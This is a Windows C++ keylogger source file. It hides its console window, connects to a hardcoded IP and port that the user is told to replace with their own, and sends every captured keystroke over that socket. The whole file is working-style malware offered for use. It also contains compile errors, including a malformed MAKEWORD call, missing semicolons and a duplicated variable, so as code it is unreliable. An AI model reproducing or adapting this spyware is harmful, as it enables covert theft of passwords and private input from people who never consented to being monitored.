#define _WINSOCK_DEPRECATED_NO_WARNINGS /* we use winsock utilities and we do not want the compiler to complain about older functionalities used since the below code is sufficient for our needs. */
#pragma comment(lib, "Ws2_32.lib") /* we need the library Ws2_32.lib library in order to use sockets (networking) */

#include <iostream> //standard input/output utilities
#include <winsock2.h> //networking utilities
#include <stdio.h> //standard input/output utilities
#include <stdlib.h> //standard input/output utilities
#include <Windows.h> //Windows libraries

//initial specifications
//Always add -lws2_32 in compiler options

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); //To hide the window
	char KEY; //char var for single key
	WSADATA WSAData; //struct declaration
	SOCKET server;
	SOCKADDR_IN addr;
	WSAStartup(MAKEWORD,(2, 0), &WSAData);
	server = socket(AF_INET, SOCK_STREAM, 0);
	addr.sin_addr.s_addr = inet_addr("192.168.0.12"); //Replace with your IP Address
	addr.sin_family = AF_INET;
	addr.sin_port = htons(5555) //Replace with your listening port
	
	connect(server, (SOCKADDR *)&addr, sizeof(addr));
	
	//Following will be responsible for collection of keys pressed.
	
	while(true)
	{
		sleep(10);
		for (int KEY = 0x8; KEY < 0xFF; KEY++)
		{
			if(GetAsyncKeyState(KEY) == -32767)
			{
				char buffer[2];
				buffer[0] = KEY;
				send(server, buffer, sizeof(buffer), 0)
			}
		}
	}
	
	closesocket(server);
	WSACleanup();
}
